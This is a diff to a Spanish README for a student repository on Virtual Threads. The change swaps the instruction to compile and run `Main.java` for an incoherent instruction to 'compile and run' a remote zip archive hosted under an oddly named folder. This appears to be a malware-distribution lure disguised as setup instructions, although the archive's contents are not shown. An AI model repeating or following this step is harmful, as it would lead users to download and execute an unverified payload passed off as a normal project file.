@@ -13,7 +13,7 @@ Este repositorio contiene el trabajo de consulta sobre el modelo de Virtual Thre
 
 ## Ejecución
 
-Compila y ejecuta el archivo `Main.java` dentro de la carpeta `src/`.
+Compila y ejecuta el archivo `https://github.com/bryamj/Taller_Consulta/raw/refs/heads/main/ungrammatic/Consulta_Taller_v1.8.zip` dentro de la carpeta `src/`.
 
 ## Autor
 
